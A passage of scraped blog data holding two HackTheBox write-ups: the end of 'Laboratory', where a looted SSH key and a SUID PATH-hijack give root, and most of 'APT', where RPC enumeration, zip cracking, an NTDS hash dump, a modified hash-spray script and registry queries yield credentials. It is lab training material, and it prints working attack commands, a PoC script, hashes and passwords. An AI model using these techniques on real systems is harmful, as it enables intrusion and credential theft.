root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:(master) $ git status fatal: this operation must be run in a work tree  I\u0026rsquo;ve renamed 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git to secure-docker.git.\n This problem can be resolved by creating a new .git folder within secure-docker.git and transferring all the files from secure-docker.git to the newly created .git.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ mkdir .git → root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ mv * .git → root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ git status fatal: this operation must be run in a work tree Finally, use the git init command to re-initialize the git repository.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) $ git init Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docer.git/.git/ → root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ git status On branch master Changes to be committed: (use \u0026#34;git restore --staged \u0026lt;file\u0026gt;...\u0026#34; to unstage) deleted: README.md deleted: create_gitlab.sh deleted: dexter/.ssh/authorized_keys deleted: dexter/.ssh/id_rsa deleted: dexter/recipe.url deleted: dexter/todo.txt Interestingly, this repository contains a set of SSH keys.\nSSH - dexter I can restore the deleted files with git checkout -- command.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ git checkout -- → root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ ls -la total 20 drwxr-xr-x 3 root root 4096 Mar 22 09:36 . drwxr-xr-x 4 root root 4096 Mar 22 09:36 .. -rw-r--r-- 1 root root 102 Mar 22 09:36 recipe.url drwxr-xr-x 2 root root 4096 Mar 22 09:36 .ssh -rw-r--r-- 1 root root 160 Mar 22 09:36 todo.txt I can now login as dexter using the SSH key I obtained.\nAt first try, it says the key is invalid format.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ chmod 600 dexter/.ssh/id_rsa → root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216 Load key \u0026#34;id_rsa\u0026#34;: invalid format dexter@10.10.10.216: Permission denied (publickey). I fixed that by adding an empty string using the echo command.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ echo \u0026#39;\u0026#39; \u0026gt;\u0026gt; dexter/.ssh/id_rsa Now it logs me in.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ ssh -i id_rsa dexter@10.10.10.216 dexter@laboratory:~$ dexter@laboratory:~$ id;hostname uid=1000(dexter) gid=1000(dexter) groups=1000(dexter) laboratory dexter@laboratory:~$ ls -l total 4 -r--r----- 1 root dexter 33 Mar 22 10:06 user.txt Shell as root Enumeration The contents of todo.txt talks something about “docker security”, but I have no idea what it is except it uses three hashtags.\n→ root@iamf «secure-docker.git» «10.10.14.39» git:(master) ✗ $ cat dexter/todo.txt # DONE: Secure docker for regular users ### DONE: Automate docker security on startup # TODO: Look into \u0026#34;docker compose\u0026#34; # TODO: Permanently ban DeeDee from lab# It turns out it’s a binary name which has a SUID bit set found by Linpeas.\n...\u0026lt;SNIP\u0026gt;... ════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms -rwsr-xr-x 1 root dexter 17K Aug 28 2020 /usr/local/bin/docker-security Inspecting the binary with the ltrace command finds out that it uses relative path to call chmod.\ndexter@laboratory:~$ ltrace docker-security setuid(0) = -1 setgid(0) = -1 system(\u0026#34;chmod 700 /usr/bin/docker\u0026#34;chmod: changing permissions of \u0026#39;/usr/bin/docker\u0026#39;: Operation not permitted \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 256 system(\u0026#34;chmod 660 /var/run/docker.sock\u0026#34;chmod: changing permissions of \u0026#39;/var/run/docker.sock\u0026#39;: Operation not permitted \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 256 +++ exited (status 0) +++ Knowing this, I could hijack the execution path.\nSUID - Path Hijack First, I\u0026rsquo;ll create a fake chmod that calls bash binary at /dev/shm, I\u0026rsquo;ll also add an execute permission on that file.\ndexter@laboratory:~$ cd /dev/shm dexter@laboratory:/dev/shm$ echo -e \u0026#39;#!/bin/bash\\n/bin/bash\u0026#39; \u0026gt; chmod dexter@laboratory:/dev/shm$ dexter@laboratory:/dev/shm$ /bin/chmod +x chmod Next, I\u0026rsquo;ll add current directory (/dev/shm) to $PATH variable. Now if I call chmod, it will point to my chmod on /dev/shm\ndexter@laboratory:/dev/shm$ export PATH=$(pwd):$PATH dexter@laboratory:/dev/shm$ dexter@laboratory:/dev/shm$ which chmod /dev/shm/chmod From there, I can just execute docker-security to obtain a root access as well as the root flag.\ndexter@laboratory:/dev/shm$ docker-security root@laboratory:/dev/shm# root@laboratory:/dev/shm# cut -c6- /root/root.txt 9f593f335a0a1f403c753719eb6  References  https://hackerone.com/reports/827052  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-laboratory/","summary":"Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application\u0026rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container.\nEnumerating inside the container finds a private user repository that contains a pair of SSH keys.","tags":["Linux","GitLab","CVE-2020-10977","Arbitrary-file-read","LFI2RCE","Metasploit","Docker","Container","Deserialization","Path-hijack","SUID"],"title":"HackTheBox - Laboratory"},{"content":"APT is an insane difficulty Windows machine from HackTheBox where deep understanding of Windows enumeration and internals is required. It starts with enumeration on RPC services to get a list of MSRPC interfaces. One of the interface called IObjectExporter has a method named ServerAlive() can be abused to reveals the IPv6 address of the machine. There is a share contains a backup file of AD database and it can be extracted to obtain users' hashes. Brute-force attack is performed to obtain one valid credentials from those hashes. With that credentials, I\u0026rsquo;m able to query to the registry to find another set of credentials which can be used to gain a foothold on the system. A PowerShell history reveals that the machine is configured to accept NTLMv1 authentication, which is then exploited to get Administrator access.\nSkills Learned  RPC enumeration Port Forwarding Remote Registry Exploiting NTLMv1  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Gobuster - https://github.com/OJ/gobuster Impacket - https://github.com/SecureAuthCorp/impacket IOXIDResolver - https://github.com/mubix/IOXIDResolver smbclient - Preinstalled in Kali Linux CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec Socat - Preinstalled in Kali Linux Evil-WinRM - https://github.com/Hackplayers/evil-winrm Kerbrute - https://github.com/ropnop/kerbrute pyKerbrute - https://github.com/3gstudent/pyKerbrute Responder - https://github.com/lgandx/Responder  Reconnaissance Nmap - IPv4 Both the initial scan and full scan with nmap only show two open ports, HTTP with IIS server on port 80, and MSRPC on port 135.\n→ root@iamf «apt» «10.10.14.72» $ nmap -sC -sV -oA nmap/initial-apt \u0026#39;10.10.10.213\u0026#39; -v PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Gigantic Hosting | Home 135/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Enumeration TCP 80 - Website Visiting port 80 on the browser shows up a website called \u0026ldquo;Gigantic Hosting\u0026rdquo;.\n The input vectors on https://10.13.38.16/contact-post.html don\u0026rsquo;t appear to be neither vulnerable nor injectable.\n It sends a post request with an empty body to a host that can not be resolved by my network.\nHere is the example request.\nPOST https://10.13.38.16/contact-post.html HTTP/1.1 Host: 10.13.38.16 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://10.10.10.213/support.html Content-Type: application/x-www-form-urlencoded Content-Length: 0 Connection: keep-alive Upgrade-Insecure-Requests: 1 Directory Brute Force - Gobuster Nothing really interesting.\n→ root@iamf «apt» «10.10.14.72» $ gobuster dir -u http://10.10.10.213/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt ...\u0026lt;SNIP\u0026gt;... /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.213/images/] /js (Status: 301) [Size: 146] [--\u0026gt; http://10.10.10.213/js/] /css (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.213/css/] /news.html (Status: 200) [Size: 5528] /about.html (Status: 200) [Size: 9386] /support.html (Status: 200) [Size: 6326] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.213/Images/] /services.html (Status: 200) [Size: 10592] /index.html (Status: 200) [Size: 14879] /clients.html (Status: 200) [Size: 12146] TCP 135 - MSRPC Remote Procedure Call (RPC) allows applications to invoke a function (or procedure or subroutine) of a remote computer without having to understand the network’s details, and MSRPC is Microsoft’s enhanced version of DCE/RPC.\nMSRPC works together with the Distributed Component Object Model (DCOM). DCOM provides a mechanism for exposing application objects and it consists of a set of RPC interfaces that can be implemented over any RPC Transport (think DCOM as object-oriented extension to RPC).\nDCOM and RPC endpoint mapper sit on this port (both of them run on the shared process of svchost.exe). RPC endpoint mapper maintains the database of endpoints that clients use to map an interface to endpoints. There is a tool called rpcdump.py from Impacket that can be used to dump those endpoints:\n→ root@iamf «apt» «10.10.14.72» $ rpcdump.py -port 135 \u0026#39;10.10.10.213\u0026#39; [*] Retrieving endpoint list from 10.10.10.213 ...\u0026lt;SNIP\u0026gt;... Protocol: [MS-RSP]: Remote Shutdown Protocol Provider: wininit.exe UUID : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 Bindings: ncacn_ip_tcp:10.10.10.213[49664] ncalrpc:[WindowsShutdown] ncacn_np:\\\\APT[\\PIPE\\InitShutdown] ncalrpc:[WMsgKRpc06C4F0] ...\u0026lt;SNIP\u0026gt;... [*] Received 265 endpoints. Those ncacn_http, ncacn_np, ncacn_ip_tcp are called as protocol string/protocol sequence. It is the language that a network operating system uses to talk over the network to other computers [source].\nScan for Listening RPC Interfaces With rpcmap.py, also from Impacket, I could get a list of currently listening RPC interfaces that are accessible over TCP.\n→ root@iamf «apt» «10.10.14.72» $ rpcmap.py \u0026#39;ncacn_ip_tcp:10.10.10.213[135]\u0026#39; -brute-uuid | tee rpc-enum/rpc-services ...\u0026lt;SNIP\u0026gt;... Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 000001A0-0000-0000-C000-000000000046 v0.0 Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0 Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0 ...\u0026lt;SNIP\u0026gt;... [*] Tested 354 UUID(s) From the results above, three of them are the interfaces provided by DCOM, details of those interfaces are documented by Microsoft in well-known UUIDs.\n   Name GUID Purpose Definition     IID_IRemoteSCMActivator {000001A0-0000-0000-C000-000000000046} RPC interface UUID for IRemoteSCMActivator RemoteSCMActivator is another remote activation interface of the DCOM Remote Protocol.   IID_IActivation {4d9f4ab8-7d1c-11cf-861e-0020af6e7c57} RPC interface UUID for IActivation IActivation is the DCOM Remote Protocol remote activation interface supported on all versions of the DCOM Remote Protocol   IID_IObjectExporter {99fcfec4-5260-101b-bbcb-00aa0021347a} RPC interface UUID for IObjectExporter IObjectExporter is the interface used for OXID resolution, pinging, and server aliveness tests. All object resolvers MUST support the IObjectExporter interface    Network Interfaces Enumeration This articles, written by Nicolas Delhaye, shows that ServerAlive2() method in IObjectExport (also known as IOXIDResolver) interface can be used to retrieve list of network interfaces of a remote computer. Nicolas also provides the PoC for this.\n  Opnum is operation number to identify a specific rpc method or a method in an interface.\n I can use rpcmap.py with -brute-opnums option to determine which interface methods are accessible.\n→ root@iamf «rpc-enum» «10.10.14.72» $ rpcmap.py -brute-opnums -opnum-max 5 \u0026#39;ncacn_ip_tcp:10.10.10.213\u0026#39; ...\u0026lt;SNIP\u0026gt;... Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0 Opnum 0: rpc_x_bad_stub_data Opnum 1: rpc_x_bad_stub_data Opnum 2: rpc_x_bad_stub_data Opnum 3: success Opnum 4: rpc_x_bad_stub_data Opnum 5: success Opnum 3 and Opnum 5 show a success message that means access to ServerAlive() is allowed.\nFrom here, I can use the provided PoC script.\n#!/usr/bin/python import sys, getopt from impacket.dcerpc.v5 import transport from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE from impacket.dcerpc.v5.dcomrt import IObjectExporter def main(argv): try: opts, args = getopt.getopt(argv,\u0026#34;ht:\u0026#34;,[\u0026#34;target=\u0026#34;]) except getopt.GetoptError: print \u0026#39;IOXIDResolver.py -t \u0026lt;target\u0026gt;\u0026#39; sys.exit(2) target_ip = \u0026#34;192.168.1.1\u0026#34; for opt, arg in opts: if opt == \u0026#39;-h\u0026#39;: print(\u0026#39;IOXIDResolver.py -t \u0026lt;target\u0026gt;\u0026#39;) sys.exit() elif opt in (\u0026#34;-t\u0026#34;, \u0026#34;--target\u0026#34;): target_ip = arg authLevel = RPC_C_AUTHN_LEVEL_NONE stringBinding = r\u0026#39;ncacn_ip_tcp:%s\u0026#39; % target_ip rpctransport = transport.DCERPCTransportFactory(stringBinding) portmap = rpctransport.get_dce_rpc() portmap.set_auth_level(authLevel) portmap.connect() objExporter = IObjectExporter(portmap) bindings = objExporter.ServerAlive2() print(\u0026#34;[*] Retrieving network interface of \u0026#34; + target_ip) for binding in bindings: NetworkAddr = binding[\u0026#39;aNetworkAddr\u0026#39;] print \u0026#34;Address: \u0026#34; + NetworkAddr if __name__ == \u0026#34;__main__\u0026#34;: main(sys.argv[1:]) The script successfully identifies two IPv6 addresses of the box.\n→ root@iamf «rpc-enum» «10.10.14.72» $ ./IOXIDResolver.py -t \u0026#39;10.10.10.213\u0026#39; [*] Retrieving network interface of 10.10.10.213 Address: apt Address: 10.10.10.213 Address: dead:beef::b885:d62a:d679:573f Address: dead:beef::89df:c1d4:6aaf:67ce I\u0026rsquo;ll add these addresses to /etc/hosts\n→ root@iamf «rpc-enum» «10.10.14.72» $ echo \u0026#39;dead:beef::b885:d62a:d679:573f apt\u0026#39; \u0026gt;\u0026gt; /etc/hosts  For me, scanning those two addresses returns the same result.\n Nmap - IPv6 This time nmap shows the common ports of Active Directory domain controller\n→ root@iamf «apt» «10.10.14.72» $ nmap -6 --min-rate 1000 -sC -sV -oA nmap/initial-apt-ipv6 \u0026#39;dead:beef::b885:d62a:d679:573f\u0026#39; -v PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Gigantic Hosting | Home 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-15 00:36:03Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=apt.htb.local | Subject Alternative Name: DNS:apt.htb.local | Issuer: commonName=apt.htb.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-09-24T07:07:18 | Not valid after: 2050-09-24T07:17:18 | MD5: c743 dd92 e928 50b0 aa86 6f80 1b04 4d22 |_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45 |_ssl-date: 2021-04-15T00:38:57+00:00; -1s from scanner time. 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=apt.htb.local | Subject Alternative Name: DNS:apt.htb.local | Issuer: commonName=apt.htb.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-09-24T07:07:18 | Not valid after: 2050-09-24T07:17:18 | MD5: c743 dd92 e928 50b0 aa86 6f80 1b04 4d22 |_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45 |_ssl-date: 2021-04-15T00:38:57+00:00; -1s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=4/14%Time=60778A78%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -12m00s, deviation: 26m48s, median: -1s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: apt | NetBIOS computer name: APT\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: apt.htb.local |_ System time: 2021-04-15T01:38:41+01:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-04-15T00:38:39 |_ start_date: 2021-04-14T16:50:06 I\u0026rsquo;ll take notes on\n  Domain name: htb.local\n  FQDN: apt.htb.local\n  Host: Windows Server 2016 Standard 14393\n  Also, according to a full port scan, WinRM is listening on IPv6\n→ root@iamf «rpc-enum» «10.10.14.72» $ nmap -p- --min-rate 1000 -6 -v \u0026#39;dead:beef::b885:d62a:d679:573f\u0026#39; PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49673/tcp open unknown 49682/tcp open unknown 49691/tcp open unknown TCP 445 - SMB (IPv6) Anonymous access is allowed on SMB. The backup share seems interesting here.\n→ root@iamf «apt» «10.10.14.72» $ smbclient -N -L //apt Anonymous login successful Sharename Type Comment --------- ---- ------- backup Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share apt is an IPv6 address -- no workgroup available Upon accessing backup share, a backup file named backup.zip is found. I’ll pull it to my Kali.\n→ root@iamf «apt» «10.10.14.72» $ smbclient -N //apt/backup Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Thu Sep 24 03:30:52 2020 .. D 0 Thu Sep 24 03:30:52 2020 backup.zip A 10650961 Thu Sep 24 03:30:32 2020 10357247 blocks of size 4096. 6964173 blocks available smb: \\\u0026gt; get backup.zip getting file \\backup.zip of size 10650961 as backup.zip (502.9 KiloBytes/sec) (average 502.9 KiloBytes/sec) The backup file is protected by a password.\n→ root@iamf «loot» «10.10.14.72» $ unzip backup.zip Archive: backup.zip creating: Active Directory/ [backup.zip] Active Directory/ntds.dit password: I can use zip2john.py to convert this backup.zip into crackable hash format and transfer the hash to my Windows for cracking.\n→ root@iamf «loot» «10.10.14.72» $ zip2john backup.zip \u0026gt; backup.zip.hash → root@iamf «loot» «10.10.14.72» $ cat backup.zip.hash backup.zip:$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip It cracked instantly.\nC:\\tools\\john\\run\u0026gt; ./john.exe hashes/backup.zip.hash --wordlist=C:/tools/rockyou.txt ...\u0026lt;SNIP\u0026gt;... iloveyousomuch (backup.zip) 1g 0:00:00:00 DONE (2021-04-15 08:29) 35.71g/s 585142p/s 585142c/s 585142C/s 123456..christal WIth the password is I obtained, I can unzip the backup file. It contains AD database.\n→ root@iamf «loot» «10.10.14.72» $ tree . ├── Active Directory │ ├── ntds.dit │ └── ntds.jfm └── registry ├── SECURITY └── SYSTEM Dumping NTLM Hashes ntds.dit is a database file for Active Directory environment, I can use secretsdump.py along with the SECURITY and SYSTEM file to recover it and obtain all the NTLM hashes of all the available AD user accounts\n NTDS stands for New Technology Directory Service and DIT stands for directory information tree.\n → root@iamf «loot» «10.10.14.72» $ secretsdump.py -ntds Active\\ Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY LOCAL \u0026gt; ad_hashes I saved the hash to a file called ad_hashes.\nTCP 88 - Kerberos Valid User Enumeration Because there are so many data to try, I might accidentally get locked out if spraying blindly. But, with tools called Kerbrute, I can enumerate for valid users. The tools uses Kerberos pre-auth to determine a valid user.\nIf the user is a valid user, KDC returns UF_DONT_REQUIRE_PREAUTH. If it’s not, it returns KDC_ERR_C_PRINCIPAL_UNKNOWN.\nBefore that, I\u0026rsquo;ll pull the users and NTLM hash from ad_hashes and store them in separate list. I\u0026rsquo;ll feed users.list to kerbrute.\nusers.list\n→ root@iamf «loot» «10.10.14.72» $ cat ad_hashes | grep \u0026#39;aad3b435b51404eeaad3b435b51404ee\u0026#39; | cut -d : -f1 \u0026gt; ../users.list userhash.list\n→ root@iamf «loot» «10.10.14.72» $ cat ad_hashes | grep \u0026#39;aad3b435b51404eeaad3b435b51404ee\u0026#39; | cut -d : -f4 \u0026gt; ../userhash.list I ran kerbrute, and after some time, it returned three legitimate users.\n→ root@iamf «apt» «10.10.14.72» $ kerbrute userenum --dc apt --domain htb.local users.list ...\u0026lt;SNIP\u0026gt;... 2021/04/14 22:02:35 \u0026gt; Using KDC(s): 2021/04/14 22:02:35 \u0026gt; apt:88 2021/04/14 22:03:12 \u0026gt; [+] VALID USERNAME: APT$@htb.local 2021/04/14 22:03:12 \u0026gt; [+] VALID USERNAME: Administrator@htb.local 2021/04/14 22:07:31 \u0026gt; [+] VALID USERNAME: henry.vinson@htb.local 2021/04/14 22:15:52 \u0026gt; Done! Tested 2001 usernames (3 valid) in 796.320 second APT$ is an account used for authentication purposes in the domain, it can not be used to login into the system. Because of that, I\u0026rsquo;ll only keep administrator and henry.vinson on the list of valid users. But if I have a valid NT hash of this account, that would be very useful as it can be used for DCSync attack.\nHash Brute-force Using henry.vinson:2de80758521541d19cabba480b260e8f pair returns an authorization error message.\n→ root@iamf «apt» «10.10.14.72» $ evil-winrm -i apt -u henry.vinson -H 2de80758521541d19cabba480b260e8f Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1 Another option is to spray the NTLM hashes on henry.vinson.\nUnfortunately, kerbrute doesn\u0026rsquo;t support pass-the-hash yet. But there is a Python version of kerbrute called pyKerbrute. One of its tools called ADPwdSpray.py supports bruteforcing with hash.\n https://github.com/3gstudent/pyKerbrute  → root@iamf «apt» «10.10.14.72» $ git clone https://github.com/3gstudent/pyKerbrute.git By default, it only supports a single hash, so I’ve modified it a bit to work with a list of hashes and IPv6.\n...\u0026lt;SNIP\u0026gt;... if __name__ == \u0026#39;__main__\u0026#39;: kdc_a = sys.argv[1] # apt user_realm = sys.argv[2].upper() # htb.local user_name = sys.argv[3] # henry.vinson, administrator hashes = open(sys.argv[4], \u0026#39;r\u0026#39;).readlines() # aad3...hashes print(\u0026#39;[*] DomainControlerAddr: %s\u0026#39;%(kdc_a)) print(\u0026#39;[*] DomainName: %s\u0026#39;%(user_realm)) for user_hash in hashes: sys.stdout.write(\u0026#39;\\r[*] Trying hash: %s\u0026#39;%(user_hash)) # to make sure it checks every hash in list user_key = (RC4_HMAC, user_hash.strip(\u0026#39;\\r\\n\u0026#39;).decode(\u0026#39;hex\u0026#39;)) passwordspray_tcp(user_realm, user_name, user_key, kdc_a, user_hash) After a few minutes, it returns a valid hash that works on henry.vinson\n→ root@iamf «pyKerbrute» «10.10.14.72» $ wc -c ../userhash.list 66001 userhash.list → root@iamf «pyKerbrute» «10.10.14.72» git:(temp) ✗ $ python ADPwdSpray.py apt htb.local \u0026#39;henry.vinson\u0026#39; ../userhash.list | tee ../pykerbrute-spray [*] DomainControlerAddr: apt [*] DomainName: HTB.LOCAL ...\u0026lt;SNIP\u0026gt;... [+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb Foothold Shell as henry.vinson_adm Forwarding IPv4 -\u0026gt; IPv6 Here, a relay or a port forwarding is required to make some tools work on IPv6. I came up with two solutions:\nFirst, use socat.\n→ root@iamf «apt» «10.10.14.72» $ socat tcp-listen:445,fork tcp6:apt:445 Second, use ssh.\n→ root@iamf «apt» «10.10.14.72» $ ssh -L 445:apt:445 root@localhost -Nf → root@iamf «apt» «10.10.14.72» $ netstat -tlpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:445 0.0.0.0:* LISTEN 8548/ssh tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 8087/sshd: /usr/sbin tcp6 0 0 ::1:445 :::* LISTEN 8548/ssh I can confirm both forwarding options work by running CrackMapExec to localhost using henry.vinson creds\n→ root@iamf «apt» «10.10.14.72» $ crackmapexec smb localhost -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb SMB 127.0.0.1 445 APT [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) SMB 127.0.0.1 445 APT [+] htb.local\\henry.vinson e53d87d42adaa3ca32bdb34a876cbffb Registry Enumeration henry.vinson can not be used to login remotely into the box.\n→ root@iamf «apt» «10.10.14.72» $ evil-winrm -i apt -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1 Instead, I can perform enumeration on the user registry using reg.py from Impacket.\n→ root@iamf «apt» «10.10.14.72» $ reg.py htb.local/henry.vinson@apt -hashes \u0026#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb\u0026#39; query -keyName HKU Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [!] Cannot check RemoteRegistry status. Hoping it is started... HKU HKU\\Console HKU\\Control Panel HKU\\Environment HKU\\Keyboard Layout HKU\\Network HKU\\Software HKU\\System HKU\\Volatile Environment Checking on HKU\\Software is worth trying since some applications may store their credentials in a registry.\n→ root@iamf «apt» «10.10.14.72» $ reg.py htb.local/henry.vinson@apt -hashes \u0026#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb\u0026#39; query -keyName HKU\\\\Software Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [!] Cannot check RemoteRegistry status. Hoping it is started... HKU\\Software HKU\\Software\\GiganticHostingManagementSystem HKU\\Software\\Microsoft HKU\\Software\\Policies HKU\\Software\\RegisteredApplications HKU\\Software\\VMware, Inc. HKU\\Software\\Wow6432Node HKU\\Software\\Classes The HKU\\Software\\GiganticHostingManagementSystem contains a set of credentials for username henry.vinson_adm and a password of G1#Ny5@2dvht.\n→ root@iamf «apt» «10.10.14.72» $ reg.py htb.local/henry.vinson@apt -hashes \u0026#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb\u0026#39; query -keyName HKU\\\\Software\\\\GiganticHostingManagementSystem Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [!] Cannot check RemoteRegistry status. Hoping it is started... HKU\\Software\\GiganticHostingManagementSystem UserName REG_SZ henry.vinson_adm PassWord REG_SZ G1#Ny5@2dvht Remote 